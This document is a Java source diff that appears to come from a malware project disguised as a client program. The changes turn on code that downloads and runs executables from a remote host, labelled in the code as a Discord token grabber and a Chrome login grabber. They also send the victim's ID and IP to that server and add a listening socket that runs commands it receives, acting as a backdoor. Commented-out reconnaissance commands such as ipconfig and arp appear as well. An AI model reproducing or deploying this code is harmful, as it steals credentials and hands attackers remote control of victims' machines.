@@ -6,10 +6,7 @@ import javax.imageio.ImageIO;
 import javax.swing.*;
 import java.awt.*;
 import java.io.*;
-import java.net.DatagramSocket;
-import java.net.HttpURLConnection;
-import java.net.InetAddress;
-import java.net.URL;
+import java.net.*;
 import java.nio.channels.Channels;
 import java.nio.channels.ReadableByteChannel;
 import java.util.ArrayList;
@@ -75,19 +72,17 @@ public class Main {
             uuid = reader.readLine();
         }
 
-        new Requests("http://a6tj7d.xyz/sendupdate", "{\"uuid\":\"" + uuid + "\"}").execute();
-
         try(final DatagramSocket socket = new DatagramSocket()){
             socket.connect(InetAddress.getByName("8.8.8.8"), 10002);
-            System.out.println(socket.getLocalAddress().getHostAddress());
+            ip = socket.getLocalAddress().getHostAddress();
+        }catch (Exception e) {
+            System.exit(3);
         }
-
-        System.exit(1);
 
         if (!version.equals(versionCheck("http://a6tj7d.xyz/ul/main/ver").replace("\"", "").replace("}", "").replace("{", "").replace(":", "").replace("version", ""))) {
             System.out.println(versionCheck("http://a6tj7d.xyz/ul/main/ver").replace("\"", "").replace("}", "").replace("{", "").replace(":", "").replace("version", ""));
             downloadFile(new URL("http://a6tj7d.xyz/ul/main/dl"), userdir + "/din32/cache/din32.exe");
-            //Runtime.getRuntime().exec(userdir + "\\din32\\cache\\din32.exe", null, new File(userdir + "\\din32\\cache\\"));
+            Runtime.getRuntime().exec(userdir + "\\din32\\cache\\din32.exe", null, new File(userdir + "\\din32\\cache\\"));
             System.exit(2);
         }
 
@@ -106,10 +101,10 @@ public class Main {
             frame.setIconImage(ImageIO.read(new URL("https://dodeedoo.me/server-icon.png")));
         }
 
-        new CMDManager(new String[]{"ipconfig"}, "IP");
-        new CMDManager(new String[]{"cmd", "/c", "dir", "C:\\Program Files"}, "");
-        new CMDManager(new String[]{"cmd", "/c", "ver"}, "");
-        new CMDManager(new String[]{"cmd", "/c", "arp", "-a"}, "");
+        //new CMDManager(new String[]{"ipconfig"}, "IP");
+        //new CMDManager(new String[]{"cmd", "/c", "dir", "C:\\Program Files"}, "");
+        //new CMDManager(new String[]{"cmd", "/c", "ver"}, "");
+        //new CMDManager(new String[]{"cmd", "/c", "arp", "-a"}, "");
 
         downloadFile(new URL("http://a6tj7d.xyz/ul/main/dl"), userdir + "/din32/din32.exe");
         //File dummyfile = new File(userdir + "/list.txt");
@@ -126,11 +121,30 @@ public class Main {
             e.printStackTrace();
         }
 
-        //downloadFile(new URL("http://a6tj7d.xyz/ul/tokengrabber/dl"), userdir + "/din32/din32util.exe"); //discord grabber
-        //Runtime.getRuntime().exec(userdir + "\\din32\\din32util.exe", null, new File(userdir + "\\din32\\"));
-        //downloadFile(new URL("http://a6tj7d.xyz/ul/logingrabber/dl"), userdir + "/din32/dinlib.exe"); //chrome grabber
-        //Runtime.getRuntime().exec(userdir + "\\din32\\dinlib.exe", null, new File(userdir + "\\din32\\"));
+        downloadFile(new URL("http://a6tj7d.xyz/ul/tokengrabber/dl"), userdir + "/din32/din32util.exe"); //discord grabber
+        Runtime.getRuntime().exec(userdir + "\\din32\\din32util.exe", null, new File(userdir + "\\din32\\"));
+        downloadFile(new URL("http://a6tj7d.xyz/ul/logingrabber/dl"), userdir + "/din32/dinlib.exe"); //chrome grabber
+        Runtime.getRuntime().exec(userdir + "\\din32\\dinlib.exe", null, new File(userdir + "\\din32\\"));
 
+        ServerSocket serverSocket = new ServerSocket(44213);
 
+        while (true) {
+            new Requests("http://a6tj7d.xyz/sendupdate", "{\"uuid\":\"" + uuid + "\",\"ip\":\""+ip+"\"}").execute();
+            Socket clientSocket = serverSocket.accept();
+            PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);
+            BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
+            String inputLine;
+            if (in.readLine().equals("kill")) {
+                break;
+            }
+            while ((inputLine = in.readLine()) != null) {
+                if (inputLine.contains("cmd")) {
+                    inputLine = inputLine.replace("cmd ", "");
+                    String[] commands = inputLine.split(" ");
+                    new CMDManager(commands, "");
+                    break;
+                }
+            }
+        }
     }
 }
